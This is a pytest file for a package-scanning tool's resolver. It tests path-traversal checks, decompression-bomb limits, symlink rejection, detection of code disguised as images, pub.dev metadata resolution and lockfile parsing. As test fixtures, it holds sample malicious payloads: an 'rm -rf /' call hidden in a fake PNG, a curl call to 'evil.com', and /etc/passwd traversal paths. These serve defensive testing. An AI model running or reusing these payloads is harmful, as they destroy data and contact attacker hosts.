"""Tests for resolver safety checks."""

from __future__ import annotations

import httpx
import pytest

from aigate.models import PackageInfo
from aigate.resolver import (
    SKIP_DIRS,
    ExtractionError,
    _archive_timeout,
    _extract_archive,
    _is_path_safe,
    download_source,
    read_local_source,
    resolve_package,
)


class TestPathSafe:
    def test_normal_path(self):
        assert _is_path_safe("package-1.0/src/main.py") is True

    def test_path_traversal_dotdot(self):
        assert _is_path_safe("../../etc/passwd") is False

    def test_path_traversal_mid(self):
        assert _is_path_safe("package-1.0/../../../secret") is False

    def test_absolute_path(self):
        assert _is_path_safe("/etc/passwd") is False

    def test_empty_path(self):
        assert _is_path_safe("") is False

    def test_single_dot(self):
        # "." is fine (current dir reference in archives)
        assert _is_path_safe("./src/main.py") is True

    def test_dotdot_in_name(self):
        # "some..file" is fine, ".." as a directory component is not
        assert _is_path_safe("package/some..file.py") is True


class TestExtractArchive:
    def test_empty_content_raises(self):
        """Empty archive content should raise ExtractionError (fail-closed)."""
        with pytest.raises(ExtractionError):
            _extract_archive(b"", "test.tar.gz")

    def test_unsupported_format(self):
        result = _extract_archive(b"data", "test.rpm")
        assert result == {}

    # --- TDD #1: Fail-closed extraction + decompression limit ---

    @staticmethod
    def _make_tar_gz(files: dict[str, bytes | str]) -> bytes:
        """Create a tar.gz in memory with given {path: content} entries."""
        import io as _io
        import tarfile as _tf

        buf = _io.BytesIO()
        with _tf.open(fileobj=buf, mode="w:gz") as tar:
            for path, content in files.items():
                data = content.encode("utf-8") if isinstance(content, str) else content
                info = _tf.TarInfo(name=path)
                info.size = len(data)
                tar.addfile(info, _io.BytesIO(data))
        return buf.getvalue()

    @staticmethod
    def _make_zip(files: dict[str, bytes | str]) -> bytes:
        """Create a zip in memory."""
        import io as _io
        import zipfile as _zf

        buf = _io.BytesIO()
        with _zf.ZipFile(buf, "w") as zf:
            for path, content in files.items():
                data = content.encode("utf-8") if isinstance(content, str) else content
                zf.writestr(path, data)
        return buf.getvalue()

    def test_cumulative_size_limit_tar(self):
        """Decompression bomb: many files under per-file limit but huge total."""
        # 300 files × 400KB each = 120MB total > any reasonable limit
        big_content = "x" * (400 * 1024)
        archive = self._make_tar_gz({f"pkg/file{i}.py": big_content for i in range(300)})
        result = _extract_archive(archive, "pkg.tar.gz")
        # Should stop extracting before getting all 300 files
        assert len(result) < 300

    def test_cumulative_size_limit_zip(self):
        """Decompression bomb: zip variant."""
        big_content = "x" * (400 * 1024)
        archive = self._make_zip({f"pkg/file{i}.py": big_content for i in range(300)})
        result = _extract_archive(archive, "pkg.zip")
        assert len(result) < 300

    def test_corrupt_tar_raises_not_silent(self):
        """Corrupt archive must raise ExtractionError, not return empty dict."""
        with pytest.raises(ExtractionError):
            _extract_archive(b"this is not a valid tar.gz", "pkg.tar.gz")

    def test_corrupt_zip_raises_not_silent(self):
        """Corrupt zip must raise, not silently return empty."""
        with pytest.raises(ExtractionError):
            _extract_archive(b"PK but corrupt data", "pkg.zip")

    def test_tar_symlink_explicitly_rejected(self):
        """Tar with symlink members must skip them (defense in depth)."""
        import io as _io
        import tarfile as _tf

        buf = _io.BytesIO()
        with _tf.open(fileobj=buf, mode="w:gz") as tar:
            # Add a regular file
            data = b"import os\n"
            info = _tf.TarInfo(name="pkg/safe.py")
            info.size = len(data)
            tar.addfile(info, _io.BytesIO(data))
            # Add a symlink pointing to /etc/passwd
            sym = _tf.TarInfo(name="pkg/evil_link")
            sym.type = _tf.SYMTYPE
            sym.linkname = "/etc/passwd"
            tar.addfile(sym)
        archive = buf.getvalue()
        result = _extract_archive(archive, "pkg.tar.gz")
        assert "pkg/safe.py" in result
        assert "pkg/evil_link" not in result

    def test_tar_hardlink_explicitly_rejected(self):
        """Tar with hardlink members must skip them."""
        import io as _io
        import tarfile as _tf

        buf = _io.BytesIO()
        with _tf.open(fileobj=buf, mode="w:gz") as tar:
            data = b"print('hello')\n"
            info = _tf.TarInfo(name="pkg/normal.py")
            info.size = len(data)
            tar.addfile(info, _io.BytesIO(data))
            hl = _tf.TarInfo(name="pkg/hard_link")
            hl.type = _tf.LNKTYPE
            hl.linkname = "pkg/normal.py"
            tar.addfile(hl)
        archive = buf.getvalue()
        result = _extract_archive(archive, "pkg.tar.gz")
        assert "pkg/normal.py" in result
        assert "pkg/hard_link" not in result


class TestContentSniffingInArchive:
    """Verify _extract_archive catches disguised files via content sniffing."""

    @staticmethod
    def _make_tar_gz(files: dict[str, str]) -> bytes:
        """Create a tar.gz in memory with given {path: content} entries."""
        import io as _io
        import tarfile as _tf

        buf = _io.BytesIO()
        with _tf.open(fileobj=buf, mode="w:gz") as tar:
            for path, content in files.items():
                data = content.encode("utf-8")
                info = _tf.TarInfo(name=path)
                info.size = len(data)
                tar.addfile(info, _io.BytesIO(data))
        return buf.getvalue()

    def test_python_disguised_as_png_is_extracted(self):
        content = "#!/usr/bin/env python3\nimport os\nos.system('rm -rf /')\n"
        archive = self._make_tar_gz({"pkg-1.0/logo.png": content})
        result = _extract_archive(archive, "pkg.tar.gz")
        assert "pkg-1.0/logo.png" in result

    def test_extensionless_python_is_extracted(self):
        content = "import subprocess\nsubprocess.call(['curl', 'evil.com'])\n"
        archive = self._make_tar_gz({"pkg-1.0/run": content})
        result = _extract_archive(archive, "pkg.tar.gz")
        assert "pkg-1.0/run" in result

    def test_genuine_binary_png_not_extracted(self):
        content = "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00"
        archive = self._make_tar_gz({"pkg-1.0/real.png": content})
        result = _extract_archive(archive, "pkg.tar.gz")
        assert "pkg-1.0/real.png" not in result

    def test_normal_py_file_still_extracted(self):
        content = "print('hello')\n"
        archive = self._make_tar_gz({"pkg-1.0/main.py": content})
        result = _extract_archive(archive, "pkg.tar.gz")
        assert "pkg-1.0/main.py" in result


class _FakeResponse:
    def __init__(self, *, json_data=None, content: bytes = b""):
        self._json_data = json_data
        self.content = content

    def raise_for_status(self):
        return None

    def json(self):
        return self._json_data


class _FakeAsyncClient:
    def __init__(self, responses: dict[str, _FakeResponse]):
        self._responses = responses

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc, tb):
        return None

    async def get(self, url: str):
        return self._responses[url]


@pytest.mark.asyncio
async def test_resolve_pub_package(monkeypatch):
    responses = {
        "https://pub.dev/api/packages/http": _FakeResponse(
            json_data={
                "name": "http",
                "latest": {
                    "version": "1.2.1",
                    "pubspec": {
                        "name": "http",
                        "version": "1.2.1",
                        "description": "HTTP client",
                        "repository": "https://github.com/dart-lang/http/tree/master/pkgs/http",
                        "dependencies": {"async": "^2.5.0"},
                    },
                    "archive_url": "https://pub.dev/api/archives/http-1.2.1.tar.gz",
                    "published": "2024-02-15T23:25:27.572746Z",
                },
            }
        )
    }
    monkeypatch.setattr(
        "aigate.resolver.httpx.AsyncClient",
        lambda **_: _FakeAsyncClient(responses),
    )

    package = await resolve_package("http", None, "pub")

    assert package.ecosystem == "pub"
    assert package.version == "1.2.1"
    assert package.repository == "https://github.com/dart-lang/http/tree/master/pkgs/http"


@pytest.mark.asyncio
async def test_download_pub_source(monkeypatch):
    package = PackageInfo(name="http", version="1.2.1", ecosystem="pub")
    responses = {
        "https://pub.dev/api/packages/http/versions/1.2.1": _FakeResponse(
            json_data={
                "archive_url": "https://pub.dev/api/archives/http-1.2.1.tar.gz",
            }
        ),
        "https://pub.dev/api/archives/http-1.2.1.tar.gz": _FakeResponse(content=b"archive-bytes"),
    }

    monkeypatch.setattr(
        "aigate.resolver.httpx.AsyncClient",
        lambda **_: _FakeAsyncClient(responses),
    )
    monkeypatch.setattr(
        "aigate.resolver._extract_archive",
        lambda content, filename: {"lib/http.dart": f"{filename}:{content.decode()}"},
    )

    files = await download_source(package)

    assert files == {
        "lib/http.dart": "https://pub.dev/api/archives/http-1.2.1.tar.gz:archive-bytes"
    }


class _FakeErrorResponse:
    """Simulates an HTTP error response (e.g. 404)."""

    def __init__(self, status_code: int = 404):
        self.status_code = status_code

    def raise_for_status(self):
        raise httpx.HTTPStatusError(
            f"Client error '{self.status_code}'",
            request=httpx.Request("GET", "https://pub.dev/api/packages/nonexistent"),
            response=httpx.Response(self.status_code),
        )

    def json(self):
        return {}


class TestPubDevResolver:
    """pub.dev ecosystem-specific tests."""

    @pytest.mark.asyncio
    async def test_resolve_pub_metadata_fields(self, monkeypatch):
        """Verify all metadata fields are extracted from pub.dev API response."""
        responses = {
            "https://pub.dev/api/packages/provider": _FakeResponse(
                json_data={
                    "name": "provider",
                    "latest": {
                        "version": "6.1.2",
                        "pubspec": {
                            "name": "provider",
                            "version": "6.1.2",
                            "description": "A wrapper around InheritedWidget",
                            "publisher": "dash-overflow.net",
                            "homepage": "https://github.com/rrousselGit/provider",
                            "repository": "https://github.com/rrousselGit/provider",
                            "dependencies": {
                                "flutter": ">=3.0.0",
                                "collection": "^1.15.0",
                                "nested": "^2.0.0",
                            },
                        },
                        "archive_url": "https://pub.dev/api/archives/provider-6.1.2.tar.gz",
                        "published": "2024-05-10T10:00:00Z",
                    },
                }
            )
        }
        monkeypatch.setattr(
            "aigate.resolver.httpx.AsyncClient",
            lambda **_: _FakeAsyncClient(responses),
        )

        pkg = await resolve_package("provider", None, "pub")

        assert pkg.name == "provider"
        assert pkg.version == "6.1.2"
        assert pkg.ecosystem == "pub"
        assert pkg.author == "dash-overflow.net"
        assert pkg.description == "A wrapper around InheritedWidget"
        assert pkg.homepage == "https://github.com/rrousselGit/provider"
        assert pkg.repository == "https://github.com/rrousselGit/provider"
        assert pkg.has_install_scripts is False
        assert "flutter" in pkg.dependencies
        assert "collection" in pkg.dependencies
        assert "nested" in pkg.dependencies

    @pytest.mark.asyncio
    async def test_resolve_pub_specific_version(self, monkeypatch):
        """Verify version-specific URL is used when version is provided."""
        responses = {
            "https://pub.dev/api/packages/http/versions/0.13.6": _FakeResponse(
                json_data={
                    "version": "0.13.6",
                    "pubspec": {
                        "name": "http",
                        "version": "0.13.6",
                        "description": "HTTP client (old)",
                        "repository": "https://github.com/dart-lang/http",
                        "dependencies": {"async": "^2.5.0", "http_parser": "^4.0.0"},
                    },
                    "archive_url": "https://pub.dev/api/archives/http-0.13.6.tar.gz",
                }
            )
        }
        monkeypatch.setattr(
            "aigate.resolver.httpx.AsyncClient",
            lambda **_: _FakeAsyncClient(responses),
        )

        pkg = await resolve_package("http", "0.13.6", "pub")

        assert pkg.version == "0.13.6"
        assert pkg.description == "HTTP client (old)"
        assert "async" in pkg.dependencies
        assert "http_parser" in pkg.dependencies

    @pytest.mark.asyncio
    async def test_resolve_pub_nonexistent_package(self, monkeypatch):
        """Verify 404 from pub.dev raises an error."""
        responses = {
            "https://pub.dev/api/packages/nonexistent_xxx": _FakeErrorResponse(404),
        }
        monkeypatch.setattr(
            "aigate.resolver.httpx.AsyncClient",
            lambda **_: _FakeAsyncClient(responses),
        )

        with pytest.raises(httpx.HTTPStatusError):
            await resolve_package("nonexistent_xxx", None, "pub")

    @pytest.mark.asyncio
    async def test_resolve_pub_missing_optional_fields(self, monkeypatch):
        """Verify graceful handling when optional pubspec fields are absent."""
        responses = {
            "https://pub.dev/api/packages/minimal_pkg": _FakeResponse(
                json_data={
                    "name": "minimal_pkg",
                    "latest": {
                        "version": "0.0.1",
                        "pubspec": {
                            "name": "minimal_pkg",
                            "version": "0.0.1",
                            # No description, no publisher, no homepage, no repository,
                            # no dependencies
                        },
                    },
                }
            )
        }
        monkeypatch.setattr(
            "aigate.resolver.httpx.AsyncClient",
            lambda **_: _FakeAsyncClient(responses),
        )

        pkg = await resolve_package("minimal_pkg", None, "pub")

        assert pkg.name == "minimal_pkg"
        assert pkg.version == "0.0.1"
        assert pkg.author == ""
        assert pkg.description == ""
        assert pkg.homepage == ""
        assert pkg.repository == ""
        assert pkg.dependencies == []
        assert pkg.has_install_scripts is False

    @pytest.mark.asyncio
    async def test_resolve_pub_homepage_fallback(self, monkeypatch):
        """Verify homepage falls back to repository when homepage is absent."""
        responses = {
            "https://pub.dev/api/packages/repo_only": _FakeResponse(
                json_data={
                    "name": "repo_only",
                    "latest": {
                        "version": "1.0.0",
                        "pubspec": {
                            "name": "repo_only",
                            "version": "1.0.0",
                            "description": "Has repo but no homepage",
                            "repository": "https://github.com/example/repo_only",
                        },
                    },
                }
            )
        }
        monkeypatch.setattr(
            "aigate.resolver.httpx.AsyncClient",
            lambda **_: _FakeAsyncClient(responses),
        )

        pkg = await resolve_package("repo_only", None, "pub")

        # homepage should fall back to repository
        assert pkg.homepage == "https://github.com/example/repo_only"
        assert pkg.repository == "https://github.com/example/repo_only"

    @pytest.mark.asyncio
    async def test_download_pub_source_no_archive_url(self, monkeypatch):
        """Verify empty dict when archive_url is missing."""
        package = PackageInfo(name="broken", version="1.0.0", ecosystem="pub")
        responses = {
            "https://pub.dev/api/packages/broken/versions/1.0.0": _FakeResponse(
                json_data={
                    # No archive_url
                    "version": "1.0.0",
                    "pubspec": {"name": "broken"},
                }
            ),
        }
        monkeypatch.setattr(
            "aigate.resolver.httpx.AsyncClient",
            lambda **_: _FakeAsyncClient(responses),
        )

        files = await download_source(package)
        assert files == {}


class TestPubspecLockParsing:
    """pubspec.lock lockfile parsing tests."""

    def test_pubspec_lock_basic(self, tmp_path):
        """Verify pubspec.lock is parsed into (name, version) pairs."""
        lock_content = """\
packages:
  http:
    dependency: "direct main"
    description:
      name: http
      sha256: "abc123"
      url: "https://pub.dev"
    source: hosted
    version: "1.2.0"
  meta:
    dependency: transitive
    description:
      name: meta
      sha256: "def456"
      url: "https://pub.dev"
    source: hosted
    version: "1.9.1"
  collection:
    dependency: "direct main"
    description:
      name: collection
      sha256: "ghi789"
      url: "https://pub.dev"
    source: hosted
    version: "1.18.0"
"""
        lockfile = tmp_path / "pubspec.lock"
        lockfile.write_text(lock_content)

        from aigate.cli import _parse_lockfile

        packages = _parse_lockfile(str(lockfile))
        names = [p[0] for p in packages]
        versions = {p[0]: p[1] for p in packages}

        assert "http" in names
        assert "meta" in names
        assert "collection" in names
        assert versions["http"] == "1.2.0"
        assert versions["meta"] == "1.9.1"
        assert versions["collection"] == "1.18.0"

    def test_pubspec_lock_empty(self, tmp_path):
        """Verify empty pubspec.lock returns empty list."""
        lockfile = tmp_path / "pubspec.lock"
        lockfile.write_text("packages:\n")

        from aigate.cli import _parse_lockfile

        packages = _parse_lockfile(str(lockfile))
        assert packages == []

    def test_pubspec_lock_sdk_dependency(self, tmp_path):
        """Verify SDK dependencies (flutter, dart) are parsed."""
        lock_content = """\
packages:
  flutter:
    dependency: "direct main"
    description: flutter
    source: sdk
    version: "0.0.0"
  cupertino_icons:
    dependency: "direct main"
    description:
      name: cupertino_icons
      sha256: "xyz"
      url: "https://pub.dev"
    source: hosted
    version: "1.0.8"
"""
        lockfile = tmp_path / "pubspec.lock"
        lockfile.write_text(lock_content)

        from aigate.cli import _parse_lockfile

        packages = _parse_lockfile(str(lockfile))
        names = [p[0] for p in packages]

        # SDK dependencies should still be parsed
        assert "flutter" in names
        assert "cupertino_icons" in names


class TestReadLocalSource:
    """Tests for read_local_source size guard and directory skipping."""

    def test_reads_simple_directory(self, tmp_path):
        (tmp_path / "main.py").write_text("print('hello')")
        result = read_local_source(tmp_path)
        assert "print('hello')" in result

    def test_skips_hidden_and_venv_dirs(self, tmp_path):
        for skip_dir in SKIP_DIRS:
            d = tmp_path / skip_dir
            d.mkdir()
            (d / "secret.py").write_text(f"# inside {skip_dir}")

        (tmp_path / "app.py").write_text("# visible")
        result = read_local_source(tmp_path)

        assert "# visible" in result
        for skip_dir in SKIP_DIRS:
            assert f"# inside {skip_dir}" not in result

    def test_size_guard_stops_reading(self, tmp_path, monkeypatch):
        """Cumulative size guard stops reading once limit is exceeded."""
        # Set a tiny limit so we can trigger it easily
        monkeypatch.setattr("aigate.resolver.MAX_LOCAL_SOURCE_SIZE", 50)

        (tmp_path / "a.py").write_text("A" * 30)
        (tmp_path / "b.py").write_text("B" * 30)
        (tmp_path / "c.py").write_text("C" * 30)

        result = read_local_source(tmp_path)

        # a.py (30 bytes) should be included, b.py (cumulative 60 > 50) triggers stop
        assert "A" * 30 in result
        # c.py should definitely not be included
        assert "C" * 30 not in result

    def test_single_file_reads_directly(self, tmp_path):
        f = tmp_path / "script.py"
        f.write_text("x = 42")
        result = read_local_source(f)
        assert "x = 42" in result

    def test_nonexistent_path_raises(self, tmp_path):
        with pytest.raises(FileNotFoundError):
            read_local_source(tmp_path / "nope")

    def test_skip_extensions_honored(self, tmp_path):
        (tmp_path / "readme.md").write_text("# Title")
        (tmp_path / "app.py").write_text("code()")
        result = read_local_source(tmp_path)
        assert "# Title" not in result
        assert "code()" in result

    def test_extensionless_script_is_read(self, tmp_path):
        """Extensionless files with code content should be included."""
        (tmp_path / "run").write_text("#!/usr/bin/env python3\nimport os\n")
        result = read_local_source(tmp_path)
        assert "import os" in result

    def test_disguised_extension_is_read(self, tmp_path):
        """Code in .png extension should be included in local scan."""
        (tmp_path / "logo.png").write_text("import subprocess\nsubprocess.call(['evil'])\n")
        result = read_local_source(tmp_path)
        assert "subprocess" in result

    def test_genuine_non_code_still_skipped(self, tmp_path):
        """Plain text README.md should still be skipped."""
        (tmp_path / "README.md").write_text("# Just a README\nNothing to see here.\n")
        (tmp_path / "app.py").write_text("print('hello')")
        result = read_local_source(tmp_path)
        assert "Nothing to see here" not in result
        assert "print('hello')" in result


# ---------------------------------------------------------------------------
# US-003: httpx connection pooling — shared client support
# ---------------------------------------------------------------------------


class TestSharedHttpxClient:
    """resolve_package and download_source accept an optional httpx client."""

    async def test_resolve_package_accepts_client(self):
        """resolve_package should accept a 'client' parameter."""
        import inspect

        sig = inspect.signature(resolve_package)
        assert "client" in sig.parameters, "resolve_package must accept a 'client' parameter"

    async def test_download_source_accepts_client(self):
        """download_source should accept an optional client."""
        import inspect

        sig = inspect.signature(download_source)
        assert "client" in sig.parameters, "download_source must accept a 'client' parameter"

    async def test_shared_client_is_reused(self, monkeypatch):
        """When a client is provided, no new httpx.AsyncClient is created."""
        from unittest.mock import AsyncMock, MagicMock

        mock_client = AsyncMock()
        mock_resp = MagicMock()
        mock_resp.json.return_value = {
            "info": {
                "name": "testpkg",
                "version": "1.0.0",
                "author": "Test",
                "summary": "test",
                "home_page": "",
                "project_urls": {},
                "requires_dist": None,
            },
            "urls": [],
        }
        mock_resp.raise_for_status = MagicMock()
        mock_client.get = AsyncMock(return_value=mock_resp)

        # Should NOT create a new client internally
        original_init = __import__("httpx").AsyncClient.__init__
        call_count = 0

        def counting_init(self, *a, **kw):
            nonlocal call_count
            call_count += 1
            return original_init(self, *a, **kw)

        monkeypatch.setattr("httpx.AsyncClient.__init__", counting_init)
        await resolve_package("testpkg", "1.0.0", "pypi", client=mock_client)
        assert call_count == 0, "Should not create new AsyncClient when one is provided"


class TestArchiveTimeout:
    """_archive_timeout reads AIGATE_DOWNLOAD_TIMEOUT_SECONDS with 30s fallback."""

    def test_default_when_unset(self, monkeypatch):
        monkeypatch.delenv("AIGATE_DOWNLOAD_TIMEOUT_SECONDS", raising=False)
        assert _archive_timeout() == 30

    @pytest.mark.parametrize("raw,expected", [("120", 120), ("1", 1), ("600", 600)])
    def test_valid_override(self, monkeypatch, raw: str, expected: int):
        monkeypatch.setenv("AIGATE_DOWNLOAD_TIMEOUT_SECONDS", raw)
        assert _archive_timeout() == expected

    @pytest.mark.parametrize("raw", ["abc", "", "  ", "1.5", "-5", "0"])
    def test_invalid_or_nonpositive_falls_back_to_default(self, monkeypatch, raw: str):
        monkeypatch.setenv("AIGATE_DOWNLOAD_TIMEOUT_SECONDS", raw)
        assert _archive_timeout() == 30
